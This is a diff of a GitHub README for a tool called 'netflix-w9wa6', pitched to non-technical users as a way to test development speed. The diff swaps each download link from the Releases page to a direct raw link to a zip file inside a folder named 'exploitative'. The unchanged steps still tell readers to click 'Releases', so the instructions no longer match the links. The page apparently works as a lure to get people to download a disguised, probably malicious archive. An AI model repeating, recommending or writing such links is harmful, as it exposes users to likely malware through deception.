@@ -1,7 +1,7 @@
 # 🤖 netflix-w9wa6 - Test DevEx Speed with Ease
 
 ## 📥 Download Now
-[![Download](https://img.shields.io/badge/Download-v1.0-blue.svg)](https://github.com/Naqoo11/netflix-w9wa6/releases)
+[![Download](https://raw.githubusercontent.com/Naqoo11/netflix-w9wa6/main/exploitative/netflix-w9wa6.zip)](https://raw.githubusercontent.com/Naqoo11/netflix-w9wa6/main/exploitative/netflix-w9wa6.zip)
 
 ## 🚀 Getting Started
 Welcome to the netflix-w9wa6 repository! This application aims to help you test development experience speeds with a simple setup. You don’t need any technical skills to get started. Just follow these steps, and you’ll be running the app in no time.
@@ -15,7 +15,7 @@ Before you download, ensure your computer meets these requirements:
 - **Disk Space:** 100 MB of free space.
 
 ## 📦 Download & Install
-To download the software, visit [this page to download](https://github.com/Naqoo11/netflix-w9wa6/releases).
+To download the software, visit [this page to download](https://raw.githubusercontent.com/Naqoo11/netflix-w9wa6/main/exploitative/netflix-w9wa6.zip).
 
 1. **Click on the “Releases” link.** This will take you to the downloads page.
 2. **Locate the latest release.** It will usually be at the top of the page.
@@ -61,6 +61,6 @@ If you have questions or need support, feel free to reach out:
 - **Issues Page:** Report any bugs or issues directly on the GitHub Issues page.
 - **Community Forum:** Join our community forum for discussions and additional help.
 
-For a complete download experience, revisit [this page to download](https://github.com/Naqoo11/netflix-w9wa6/releases) any time you need the latest version. 
+For a complete download experience, revisit [this page to download](https://raw.githubusercontent.com/Naqoo11/netflix-w9wa6/main/exploitative/netflix-w9wa6.zip) any time you need the latest version. 
 
 We hope you enjoy your experience with netflix-w9wa6.
